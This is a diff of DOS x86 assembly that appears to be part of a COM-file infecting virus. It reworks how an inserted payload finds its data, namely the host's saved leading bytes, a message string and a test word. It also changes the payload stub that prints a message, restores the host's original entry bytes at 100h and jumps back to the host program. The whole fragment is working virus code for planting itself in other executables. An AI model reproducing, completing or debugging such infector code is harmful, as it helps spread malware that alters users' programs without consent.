@@ -60,9 +60,16 @@ file_err_skip:
     mov payload_offset, al
 
     ; preparing payload addressation
-    mov payload_map[0], payload_offset - offset payload_code + offset leading_bytes + 7
-    mov payload_map[1], payload_offset - offset payload_code + offset pld_str + 7
-    mov payload_map[2], payload_offset - offset payload_code + offset test_word + 7
+    mov al, payload_offset
+    mov ah, 0
+    add ax, 107h
+    sub ax, offset payload_code
+    mov payload_map[0], ax
+    add payload_map[0], offset leading_bytes
+    mov payload_map[2], ax
+    add payload_map[2], offset pld_str
+    mov payload_map[4], ax
+    add payload_map[4], offset test_word
     
     ; moving carret to the start
     mov cx, 0
@@ -139,15 +146,24 @@ payload_code:
 
     mov bx, cs:[100h]
 
-    mov ax, [bx][2h]
+    push bx
+    mov bx, [bx][4]
+    mov ax, [bx]
+    pop bx
 
-    lea dx, [bx][1]
+    push bx
+    mov bx, [bx][2]
+    lea dx, [bx]
+    pop bx
     mov ah, 09h
     int 21h
 
-    mov ax, [bx][0]
+    push bx
+    mov bx, [bx][0]
+    mov ax, [bx]
     mov bx, 100h
     mov word ptr[bx], ax
+    pop bx
 
     mov ax, 100h
     jmp ax
